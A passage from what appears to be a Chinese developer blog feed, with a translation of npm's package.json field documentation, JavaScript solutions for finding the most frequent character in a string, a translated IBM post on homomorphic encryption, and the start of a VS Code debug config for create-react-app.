<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;Barney Rubble&quot;</span></span><br><span class="line">, <span class="attr">&quot;email&quot;</span> : <span class="string">&quot;b@rubble.com&quot;</span></span><br><span class="line">, <span class="attr">&quot;url&quot;</span> : <span class="string">&quot;http://barnyrubble.tumblr.com/&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也可以把这个简化为一个字符串,npm会自动解析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Barney Rubble &lt;b@rubble.com&gt; (http:&#x2F;&#x2F;barnyrubble.tumblr.com&#x2F;)&quot;</span><br></pre></td></tr></table></figure>

<h2 id="files"><a href="#files" class="headerlink" title="files"></a>files</h2><p>文件字段是一个文件通配符的列表,当包作为一个依赖,可以描述包的入口文件. 文件通配符与 <code>.gitignore</code> 遵循类似的语法,但是有所保留: 当打包的时候可以包含一个文件,文件夹或者一个通配符文件.忽略这个字段将会默认为<code>[*]</code>, 意思是包含所有的文件.</p>
<p>有些特殊的文件和文件夹会包含或者剔除,无论他们是否存在于<code>file</code>字段.</p>
<p>也可以提供<code>.npmingore</code>文件在包的根目录,可以防止文件被包含进去.在包的根目录下,他不会覆盖<code>files</code>字段,但是在子目录中可以.<code>.npmignore</code>文件类似于<code>.gitignore</code></p>
<p>无论设置如何, 以下的文件始终被包含:</p>
<ul>
<li>package.json</li>
<li>README</li>
<li>CHANGES / CHANGELOG / HISTORY</li>
<li>LICENSE / LICENCE</li>
<li>NOTICE</li>
<li>在’main’字段中的文件</li>
</ul>
<p>相对的,以下的文件始终被忽略</p>
<ul>
<li>.git</li>
<li>CVS</li>
<li>.svn</li>
<li>.hg</li>
<li>.lock-wscript</li>
<li>.wafpickle-N</li>
<li>.*.swp</li>
<li>.DS_Store</li>
<li>._*</li>
<li>npm-debug.log</li>
<li>.npmrc</li>
<li>node_modules</li>
<li>config.gypi</li>
<li>*.orig</li>
<li>package-lock.json (use shrinkwrap instead)</li>
</ul>
<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>main字段是程序的主入口.如果一个包名字为<code>foo</code>,一个用户安装了他,然后<code>require(&#39;foo&#39;)</code>,那么将返回主模块输出对象</p>
<p>他应该是一个相对包文件夹的相对id</p>
<p>对大部分的模块,他最大的意义就是一个入口</p>
<h2 id="browser"><a href="#browser" class="headerlink" title="browser"></a>browser</h2><p>如果模块只在浏览器端使用,那么应该设置<code>browser</code>字段而不是<code>main</code>字段.这可以提示用户, 这个包用到一些nodejs没有的特性</p>
<h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>很多包有一个或多个可执行文件,他们想要安装在<code>PATH</code>中,npm让这个非常简单,</p>
<p>为了使用这个, 提供一个<code>bin</code>字段,映射命令的名字和本地文件的名字.当安装的时候, npm会链接文件到<code>prefix/bin</code>全局安装, 或者到<code>./node_modules/.bin</code>中作为本地使用.</p>
<p>例如:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;bin&quot;</span> : &#123; <span class="attr">&quot;myapp&quot;</span> : <span class="string">&quot;./cli.js&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>如果只有一个可执行文件,他的名字就是包的名字, 那么可以只提供一个字符串.</p>
<p>还要确认<code>bin</code>字段指定的文件是<code>#!/usr/bin/env node</code>, 否则脚本就不能使用node的执行环境</p>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>给<code>man</code>程序指定一个或多个文件.</p>
<h2 id="directories"><a href="#directories" class="headerlink" title="directories"></a>directories</h2><p>commonjs规范指明了使用 <code>directories</code>对象来判断包的结构. 如果你看着package.json我,你就会看到他有文档,类库,和说明文档的目录.</p>
<p>在将来,这个信息还可以在一些其他的创造性的方式.</p>
<h2 id="repository"><a href="#repository" class="headerlink" title="repository"></a>repository</h2><p>指定在线代码的位置.这对想贡献代码的人很有帮助.如果git仓库是github,那么<code>npm docs</code>命令可以帮你找到.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;repository&quot;: &#123;</span><br><span class="line">  &quot;type&quot; : &quot;git&quot;,</span><br><span class="line">  &quot;url&quot; : &quot;https://github.com/npm/cli.git&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&quot;repository&quot;: &#123;</span><br><span class="line">  &quot;type&quot; : &quot;svn&quot;,</span><br><span class="line">  &quot;url&quot; : &quot;https://v8.googlecode.com/svn/trunk/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果包不在根目录, 也可以指定在线代码的目录,比如这样:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;repository&quot;: &#123;</span><br><span class="line">  &quot;type&quot; : &quot;git&quot;,</span><br><span class="line">  &quot;url&quot; : &quot;https://github.com/facebook/react.git&quot;,</span><br><span class="line">  &quot;directory&quot;: &quot;packages/react-dom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h2><p>这个属性指定在包的不同生命周期运行的脚本命令.key是命周期的事件,值是具体的命令.</p>
<h2 id="config"><a href="#config" class="headerlink" title="config"></a>config</h2><p>配置对象是在脚本中一直使用的配置参数.比如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;foo&quot;</span></span><br><span class="line">, <span class="attr">&quot;config&quot;</span> : &#123; <span class="attr">&quot;port&quot;</span> : <span class="string">&quot;8080&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>
<p>如果之后<code>start</code>命令引用了<code>npm_package_config_port</code>环境变量,那么用户可以通过<code>npm config set foo:port 8001</code>覆盖.例如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;npm-start&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;start2&quot;</span>:<span class="string">&quot;npm config set &#x27;npm-start&#x27;:port 8001 &amp;&amp; node index.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;config&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;port&quot;</span>: <span class="string">&quot;8080&quot;</span></span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="built_in">console</span>.log(process.env.npm_package_config_port);</span><br></pre></td></tr></table></figure>

<h2 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h2><p>依赖是一个简单的对象, 映射包的名字和版本范围.版本范围是一个字符串,有一个或多个用空格分开的描述符.依赖也可以是一个压缩文件或者一个git url.</p>
<p>不要把测试和中间文件放到依赖中, 可以放到 <code>devDependencies</code>中.</p>
<p><code>semver</code>中指定了版本的范围.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* version 精确匹配</span><br><span class="line">* &gt;version 大于当前版本</span><br><span class="line">* &gt;&#x3D;version 大于等于当前版本</span><br><span class="line">* &lt;version</span><br><span class="line">* &lt;&#x3D;version</span><br><span class="line">* ~version “Approximately equivalent to version” See semver</span><br><span class="line">* ^version “Compatible with version” See semver</span><br><span class="line">* 1.2.x 1.2.0, 1.2.1, etc., but not 1.3.0</span><br><span class="line">* http:&#x2F;&#x2F;... See ‘URLs as Dependencies’ below</span><br><span class="line">* * 任何版本</span><br><span class="line">* &quot;&quot; 空白字符串, 与*相同</span><br><span class="line">* version1 - version2 大于等于版本1, 小于等于版本2</span><br><span class="line">* range1 || range2 </span><br><span class="line">* git... </span><br><span class="line">* user&#x2F;repo</span><br><span class="line">* tag 带有标签的版本</span><br><span class="line">* path&#x2F;path&#x2F;path 本地路径</span><br></pre></td></tr></table></figure>

<h3 id="url-作为依赖"><a href="#url-作为依赖" class="headerlink" title="url 作为依赖"></a>url 作为依赖</h3><p>可以指定一个压缩文件放到版本范围中.<br>压缩文件可以下载并且本地安装</p>
<h3 id="git-url-作为依赖"><a href="#git-url-作为依赖" class="headerlink" title="git url 作为依赖"></a>git url 作为依赖</h3><p>git url 如下形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;protocol&gt;:&#x2F;&#x2F;[&lt;user&gt;[:&lt;password&gt;]@]&lt;hostname&gt;[:&lt;port&gt;][:][&#x2F;]&lt;path&gt;[#&lt;commit-ish&gt; | #semver:&lt;semver&gt;]</span><br></pre></td></tr></table></figure>

<p><code>&lt;protocol&gt;</code>是git, git+ssh, git+http, git+https, or git+file中的一个.</p>
<p>如果有<code>#&lt;commit-ish&gt;</code>,就可以精确克隆这个提交.</p>
<h3 id="github-url"><a href="#github-url" class="headerlink" title="github url"></a>github url</h3><p>可以使用<code>“foo”: “user/foo-project”</code>来指定github 链接</p>
<h3 id="本地路径"><a href="#本地路径" class="headerlink" title="本地路径"></a>本地路径</h3><p>如下形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;foo&#x2F;bar</span><br><span class="line">~&#x2F;foo&#x2F;bar</span><br><span class="line">.&#x2F;foo&#x2F;bar</span><br><span class="line">&#x2F;foo&#x2F;bar</span><br></pre></td></tr></table></figure>

<p>如果是相对路径,</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;baz&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;bar&quot;</span>: <span class="string">&quot;file:../foo/bar&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个特性可以帮助本地的离线开发者测试一些不想从外部服务器安装的包.但是在发布的公共库就不能这样使用了.</p>
<h2 id="devDependencies-开发依赖"><a href="#devDependencies-开发依赖" class="headerlink" title="devDependencies 开发依赖"></a>devDependencies 开发依赖</h2><p>如果有人计划在他们的程序中使用你的模块,那么他们可能不想或者不需要使用你的库中用到测试框架.</p>
<p>这时候, 最好把这些额外的配置放到<code>devDependencies</code>中. </p>
<p>这些东西在<code>npm link</code>和<code>npm install</code>的时候会安装, 可以想其他 npm 配置一样被管理.</p>
<p>如果不指定平台,构建,比如说把 coffeescritp 或者其他语言编译成 js,可以使用 <code>prepare</code>脚本完成这个.</p>
<p>比如说:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ethopia-waza&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;a delightfully fruity coffee varietal&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.2.3&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;coffee-script&quot;</span>: <span class="string">&quot;~1.6.3&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;prepare&quot;</span>: <span class="string">&quot;coffee -o lib/ -c src/waza.coffee&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;lib/waza.js&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>prepare</code>脚本会在发布之前运行, 用户可以自动使用这个功能. 开发模式中,也会运行这个脚本,你可以很容易测试.(TODO:)</p>
<h2 id="peerDependencies"><a href="#peerDependencies" class="headerlink" title="peerDependencies"></a><a href="https://www.cnblogs.com/wonyun/p/9692476.html">peerDependencies</a></h2><p>有些情况, 可能想要表达对宿主环境的兼容性. 你的模块可能暴露一个特定的接口,指定宿主环境的文档.例如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;tea-latte&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.3.5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;peerDependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;tea&quot;</span>: <span class="string">&quot;2.x&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这确保了你的包可以单独作为一个宿主环境的包安装.安装了<code>tea-latte</code>之后,可能会有这样的依赖图.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├── tea-latte@1.3.5</span><br><span class="line">└── tea@2.2.0</span><br></pre></td></tr></table></figure>

<p>注意:在 npm1 和 npm2 会自动安装<code>peerDenpendenices</code>.在 npm3 之后,就不是这样的.使用的时候,可能会收到一个警告,<code>peerDenpendencies</code>没有安装.在 npm1 和<br>npm2 中的这种行为,可能会导致模块地狱.</p>
<p>当有依赖冲突的时候, 会报错.</p>
<h2 id="bundledDependencies"><a href="#bundledDependencies" class="headerlink" title="bundledDependencies"></a>bundledDependencies</h2><p>这里指定了一些包,如果发布, 就打包他们.</p>
<p>当你需要在本地保留包或者想要通过文件下载, 可以设置 peerDependencies 然后执行 npm pack</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;awesome-web-framework&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;bundledDependencies&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;renderized&quot;</span>, <span class="string">&quot;super-streams&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以运行<code>npm pack</code>获得一个<code>awesome-web-framework-1.0.0.tgz</code>的文件.这个文件包含了<code>renderized and super-streams</code>这两个依赖.这里的包名不包含版本,相关的信息在 dependencies 中指定.</p>
<h2 id="optionalDependencies"><a href="#optionalDependencies" class="headerlink" title="optionalDependencies"></a>optionalDependencies</h2><p>当使用一个包的时候, 当无法找到或者安装失败, 你想要 npm 处理他,那么你需要把它放到<code>optionalDependencies</code>中.</p>
<h2 id="engines"><a href="#engines" class="headerlink" title="engines"></a>engines</h2><p>你可以指定使用的 node 版本.</p>
<p>与Dependencies类似, 如果不指定版本,那么所有的 node 版本都可以.</p>
<p>如果指定了 engine 字段,那么 npm 会在某些地方要求 node 版本.如果 engine 忽略了,npm 会默认是 node.</p>
<p>也可以指定哪个版本的 node 是可以的.比如:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">&quot;engines&quot;</span> : &#123; <span class="attr">&quot;npm&quot;</span> : <span class="string">&quot;~1.0.20&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<h2 id="engineStrict"><a href="#engineStrict" class="headerlink" title="engineStrict"></a>engineStrict</h2><p>从 npm3.0.0 就被移除啦.</p>
<h2 id="os"><a href="#os" class="headerlink" title="os"></a>os</h2><p>可能指定运行的操作系统.比如:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;os&quot; : [ &quot;darwin&quot;, &quot;linux&quot; ]</span><br></pre></td></tr></table></figure>

<p>或者指定运行系统的黑名单.</p>
<p>主机的操作系统通过<code>process.platform</code>决定.</p>
<h2 id="cpu"><a href="#cpu" class="headerlink" title="cpu"></a>cpu</h2><p>如果你的代码只能在特定架构中运行,你可以指定</p>
<h2 id="preferGlobal"><a href="#preferGlobal" class="headerlink" title="preferGlobal"></a>preferGlobal</h2><p>废弃</p>
<h2 id="private"><a href="#private" class="headerlink" title="private"></a>private</h2><p>如果设置私人为 true,那么 npm 就不会发布他.</p>
<p>这是一个阻止意外发布的方式.如果只想在特定的 registry 发布,那么就用<code>publishConfig</code></p>
<h2 id="publishConfig"><a href="#publishConfig" class="headerlink" title="publishConfig"></a>publishConfig</h2><p>这是一组在发布时使用的配置.</p>
<h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><ul>
<li><p><code>&quot;scripts&quot;: &#123;&quot;start&quot;: &quot;node server.js&quot;&#125;</code><br>如果在根目录中有一个 server.js, 那么会默认创建一个启动命令.</p>
</li>
<li><p><code>&quot;scripts&quot;:&#123;&quot;install&quot;: &quot;node-gyp rebuild&quot;&#125;</code><br>如果有一个<code>binding.gyp</code>, 而且也没有定义<code>install</code>和<code>preinstall</code>脚本.</p>
</li>
<li><p><code>&quot;contributors&quot;: [...]</code><br>如果有<code>AUTHOR</code>文件</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>翻译</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>字符串中最多的字符</title>
    <url>/2020/05/26/The-most-characters-in-a-string/</url>
    <content><![CDATA[<p>给定一段字符串, 查找查找其中做的字符和个数.</p>
<a id="more"></a>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>遍历所有的字符串, 记录每个字符出现的个数,然后取出最多的.</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>o(n)</p>
<h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>o(n)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;awfoeifaoifauwefa&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> out = &#123;&#125;;</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">i <span class="keyword">of</span> str</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">!out[i]</span>)</span>&#123;</span><br><span class="line">    out[i] = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    out[i] += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> maxNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> maxItem = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="function"><span class="title">for</span>(<span class="params">i <span class="keyword">in</span> out</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">out[i] &gt; maxNum</span>)</span>&#123;</span><br><span class="line">    maxItem = i</span><br><span class="line">    maxNum = out[i]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(maxItem, maxNum);</span><br></pre></td></tr></table></figure>

<h2 id="方法二-删除法"><a href="#方法二-删除法" class="headerlink" title="方法二 删除法"></a>方法二 删除法</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路:"></a>思路:</h3><p>每次取出第一个元素, 然后删除全部相同的, 哪一次删除的最多, 就哪一个元素最多</p>
<h3 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>o(n)</p>
<h3 id="空间复杂度-1"><a href="#空间复杂度-1" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>o(1)</p>
<blockquote>
<p>js中的字符串是不可变的,所以替换的话, 会开辟一块新的内存, 之前的str无用了, 就要等gc</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;awfoeifaoifauwefa&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> maxItem = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> maxNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (str.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> s = str[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> originLen = str.length;</span><br><span class="line">  <span class="keyword">const</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(s, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">  str = str.replace(reg, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> rLen = str.length;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> diffLen = <span class="built_in">Math</span>.abs(originLen - rLen);</span><br><span class="line">  <span class="keyword">if</span> (diffLen &gt; maxNum) &#123;</span><br><span class="line">    maxItem = s;</span><br><span class="line">    maxNum = diffLen;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(maxItem, maxNum);</span><br></pre></td></tr></table></figure>

<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三:"></a>方法三:</h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>先排序, 然后找出最多连续的</p>
<h3 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>o(nlogn):来自与<a href="https://zhuanlan.zhihu.com/p/27166852">sort函数</a><br>取出最长的重复字符串: o(n)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;awfoeifaoifauwefa&#x27;</span>;</span><br><span class="line"></span><br><span class="line">str = str.split(<span class="string">&#x27;&#x27;</span>).sort();</span><br><span class="line"><span class="keyword">let</span> cnt = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> maxNum = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> maxItem = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.length -<span class="number">1</span>; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (str[i+<span class="number">1</span>] === str[i]) &#123;</span><br><span class="line">    cnt++;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cnt &gt; maxNum) &#123;</span><br><span class="line">      maxNum = cnt;</span><br><span class="line">      maxItem = str[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cnt = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(maxItem, maxNum);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>Fully-Homomorphic-Encryption</title>
    <url>/2020/06/13/Fully-Homomorphic-Encryption/</url>
    <content><![CDATA[<p>原文: <a href="https://www.ibm.com/blogs/research/2020/06/ibm-releases-fully-homomorphic-encryption-toolkit-for-macos-and-ios-linux-and-android-coming-soon/">https://www.ibm.com/blogs/research/2020/06/ibm-releases-fully-homomorphic-encryption-toolkit-for-macos-and-ios-linux-and-android-coming-soon/</a></p>
<p>通常,当我和别人解释全同态加密的时候,我就说,虽然我已经在这个领域工作了将近十年, 但我也必须停下来拼出来.所以,让我们就简单的把它叫做FHE.</p>
<p>半开玩笑的讲,当你第一次听到FHE,它听起来就像是魔法, 但是他是基于非常安全的数学.主要的区别是,FHE需要对我们常用的编程范式做一些转换,这让她在转换为应用的时候有点困难.直到今天,多亏了我们在macos,ios和接下来的linux和安卓的新工具包,才让他变得可用.事实上,对基本的平台工具熟悉的开发者, 根据一些简单的介绍,就可以快速的上手.将11年的顶级加密研究,在泡一杯咖啡或者整理桌子的时间内,转换为免费的,开发者可用的,是一个不小的壮举.<br><img src="https://www.ibm.com/blogs/research/wp-content/uploads/2020/06/FHE.png"></p>
<h2 id="什么是FHE"><a href="#什么是FHE" class="headerlink" title="什么是FHE?"></a>什么是FHE?</h2><p>通常用来给同事和合作伙伴存储和分享数据的方法有风险.现在,文件在传输存储的时候加密,但是在使用的时候解密.这就给黑客和内部的人很多机会泄露未加密的数据.FHE补上了这个漏洞.这可以让数据在加密的时候,让有权限的合作伙伴操作数据,这减少了他在最脆弱状态的次数.</p>
<p>与其他技术联合,FHE也可以有选择的加密,所以人们只能看到他们可以访问的那一部分文件,或者他们工作所必须的文件.</p>
<h2 id="1970及之前"><a href="#1970及之前" class="headerlink" title="1970及之前"></a>1970及之前</h2><p>FHE最早在1970年被提出讨论,但是真正的突破在2009,5月31号的acm会议,彼时才被证明, 加密学者Craig Gentry,在他高引用论文.ß</p>
<p>虽然这篇论文是一个令人激动是新闻,但是很多工业界的人认为FHE还是只能存在于加密领域,因为他的计算的复杂性,需要巨量的算力,这对于日常使用来说就太慢了.<br>多亏了一个在ibm的小团队,把这个作为一个挑战,十年后FHE的性能需求,对于一些应用就足够了. 他们需要提高算法的先进性和未来的硬件加速.</p>
<h2 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h2><p>FHE给许多应用提供了希望,比如从隐私数据中提取价值;数据集合交叉;基因分析;无意识查询(比如,不带有明显意图的查询)和安全外包.</p>
<p>FHE特别适用于一些受管制和使用隐私,加密的,’皇冠宝石’数据的行业.比如金融和健康.因为这项技术可以让分享金融信息或者私人的健康记录变得可能,同时限制他们只是用有限的数据而不是全部.</p>
<p>比如,我们最近发布了一片论文,我们同态加密了数据和模型,展示了, 与未加密的数据有相同的预测精度,而且有合适的性能.这个结果表明, 银行可以安全的外包哪些运行预测任务到不可信的环境中.</p>
<h2 id="给我康康这个工具集"><a href="#给我康康这个工具集" class="headerlink" title="给我康康这个工具集"></a>给我康康这个工具集</h2><p>新的FHE工具集,适合于macos和ios在github,linux和Android几周后发布.每个工具都是基于HELib,世界上最成熟和通用的加密库,里面有示例代码非常容易的写出基于FHE的代码.</p>
<p>IOS工具包包括一个简单易用的demo, 演示了针对加密数据库的隐私保护搜索.这个数据库是kv存储,预先存储了欧洲国家的名字和他们的首都.选择一个国家会显示他们的首都.</p>
<p>需要指出的是,这不是最终完美的方案.我们希望尽快将这些概念付诸实施，将技术交到早期采用者手中，他们希望在我们建立用户和用例社区的过程中，使这些概念不那么抽象和具体。</p>
]]></content>
      <tags>
        <tag>翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode-cra-debug</title>
    <url>/2020/06/17/vscode-cra-debug/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><h2 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h2><p>cra(create-react-app)是react官方出品的初始化react的工具.他本质是一个封装了一个webpack.而webpack是依赖node运行的.所以对cra调试, 就是对nodejs调试.</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>首先选择debugg, 生成一个新的launch.json文件.</p>
<h3 id="cra官方"><a href="#cra官方" class="headerlink" title="cra官方"></a>cra官方</h3><p>链接: <a href="https://create-react-app.dev/docs/debugging-tests/">https://create-react-app.dev/docs/debugging-tests/</a></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;0.2.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;configurations&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Debug CRA Tests&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;node&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;request&quot;</span>: <span class="string">&quot;launch&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;runtimeExecutable&quot;</span>: <span class="string">&quot;$&#123;workspaceRoot&#125;/node_modules/.bin/react-scripts&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;args&quot;</span>: [<span class="string">&quot;test&quot;</span>, <span class="string">&quot;--runInBand&quot;</span>, <span class="string">&quot;--no-cache&quot;</span>, <span class="string">&quot;--watchAll=false&quot;</span>],</span><br><span class="line">      <span class="attr">&quot;cwd&quot;</span>: <span class="string">&quot;$&#123;workspaceRoot&#125;&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;inspector&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;console&quot;</span>: <span class="string">&quot;integratedTerminal&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;internalConsoleOptions&quot;</span>: <span class="string">&quot;neverOpen&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;env&quot;</span>: &#123; <span class="attr">&quot;CI&quot;</span>: <span class="string">&quot;true&quot;</span> &#125;,</span><br><span class="line">      <span class="attr">&quot;disableOptimisticBPs&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

